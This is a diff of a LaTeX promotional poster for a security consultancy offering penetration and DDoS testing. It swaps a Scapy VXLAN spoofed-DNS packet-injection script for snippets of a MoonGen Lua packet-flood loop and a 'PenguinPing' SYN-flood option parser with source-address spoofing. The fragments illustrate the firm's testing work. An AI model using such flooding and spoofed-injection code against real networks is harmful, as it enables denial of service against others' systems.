@@ -21,7 +21,7 @@
 \setlength{\columnwidth}{250mm}
 \setlength{\parindent}{0mm}
 
-\MyLogo{\color{titlecolor}Henrik Kramselund +45 2026 6000 hlk@zencurity.com @kramse \faTwitter \hskip 5mm \faGithub}
+\MyLogo{\color{titlecolor}Henrik Kramselund +45 2026 6000 hlk@zencurity.com @kramse \hskip 5mm \faGithub}
 
 \begin{document}
 
@@ -43,59 +43,62 @@
 \item We provide performance, penetration testing and DDoS testing -- port scans are free
 % \\Port scans are free, paid services result in PDF report suitable for management and customers
 \item Network security consulting, network design, routers, loadbalancing, ask
-\item Need an Intrusion Detection System (IDS) -- we recommend and run Suricata IDS and Zeek in production
+\item Need an Intrusion Detection System (IDS) -- we recommend and run Suricata IDS and Zeek
 %\\ Projects where we have recommended and configured Suricata IDS, Bro/Zeek in production setup multiple times
 \end{list2}
 
 \begin{figure}[!htb]
 \centering
-\begin{minipage}[t]{0.45\textwidth}
-\fbox{\bf\footnotesize Example pentest attacks, VXLAN packet injection}
+\begin{minipage}[t]{0.35\textwidth}
+\fbox{\bf\footnotesize DDoS script: Lua, MoonGen and DPDK}
 \vskip 12mm
 \begin{alltt}\scriptsize
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|R|R|R|R|I|R|R|R|            Reserved                           |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                VXLAN Network Identifier (VNI) |   Reserved    |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-Inner Ethernet Header:
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|             Inner Destination MAC Address                     |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-| Inner Destination MAC Address | Inner Source MAC Address      |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                Inner Source MAC Address                       |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+local txStats = stats:newDevTxCounter(queue, "plain")
+while mg.running() do
+        -- fill packets and set their size
+        bufs:alloc(packetLen)
+        for i, buf in ipairs(bufs) do
+              local pkt = buf:getIcmpPacket(ipv4)
+              if ipv4 then
+                      pkt.ip4.src:set(minIP)
+              else
+                      pkt.ip6.src:set(minIP)
+              end
+        end
+        --offload checksums to NIC
+        bufs:offloadTcpChecksums(ipv4)
+        queue:send(bufs)
+        txStats:update()
+end
+
 \end{alltt}
-\caption{VXLAN Header }
+\caption{penguinping-02.lua}
 \end{minipage}%
-\begin{minipage}[t]{0.45\textwidth}
-\fbox{\bf\footnotesize Create VXLAN header and inside packet}
+\begin{minipage}[t]{0.50\textwidth}
+\fbox{\bf\footnotesize PenguinPing uses hping3 DDoS options}
 \vskip 5mm
 \begin{minted}[fontsize=\scriptsize]{python}
-#!/usr/bin/python
-from scapy.all import *
-vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
-vni=37             # Usually VNI == destination VLAN
-vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
-    UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,
-    flags="Instance")
-broadcastmac="ff:ff:ff:ff:ff:ff"
-randommac="00:51:52:01:02:03"
-attacker="185.129.62.666"
-destination="your network"
-packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
-          dst=destination)/UDP(sport=testport,dport=insideport)/
-          DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.zencurity.com"))
+description("Generates TCP SYN flood from varying source IPs, supports both IPv4 and IPv6")
+argument("host", "Destination IP (IPv4 or IPv6).")
+option("-I --interface", "interface name"):default(0):convert(tonumber)
+option("-r --rate", "Transmit rate in Mbit/s."):default(10000):convert(tonumber)
+option("-c --count", "Packet count"):default(10000):convert(tonumber)
+option("-a --spoof", "Spoof source address (IPv4 or IPv6)."):default("10.0.0.1")
+option("-s --baseport", "TCP/UDP source port (default random)"):default(-1):convert(tonumber)
+option("-p --destport", "TCP/UDP destination port"):default(80):convert(tonumber)
+flag("-1 --icmp", "ICMP mode")
+flag("-2 --udp", "UDP mode")
 
-srp(packet)
+flag("-L --setack", "Set TCP ack")
+flag("-F --fin", "Set TCP FIN flag")
+flag("-S --syn", "Set TCP SYN flag")
+flag("-R --rst", "Set TCP RST flag")
+flag("-A --ack", "Set TCP ACK flag")
 \end{minted}
-\vskip -4mm\caption{ Spoofed DNS packets inside the perimeter}
+\vskip -4mm\caption{PenguinPing parser example}
+\centerline{See more at https://penguinping.org/}
 \end{minipage}
 \end{figure}
-
 \vskip 13mm
 \centerline{\Large $\heartsuit$ love internet packets $\heartsuit$}
 
